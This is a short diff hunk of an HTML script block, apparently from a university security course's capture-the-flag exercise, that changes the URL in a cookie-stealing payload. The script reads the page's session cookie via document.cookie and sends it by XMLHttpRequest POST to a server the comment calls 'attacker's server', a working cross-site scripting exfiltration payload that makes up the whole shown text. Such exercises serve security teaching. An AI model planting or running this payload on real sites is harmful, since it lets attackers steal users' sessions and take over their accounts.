@@ -9,7 +9,7 @@
             // Send the session cookie to attacker's server
             var cookie = document.cookie;
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "http://cs2107-ctfd-i.comp.nus.edu:5003/login");
+            xhr.open("POST", "http://cs2107-ctfd-i.comp.nus.edu:5003/");
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send("cookie=" + cookie);
         </script>
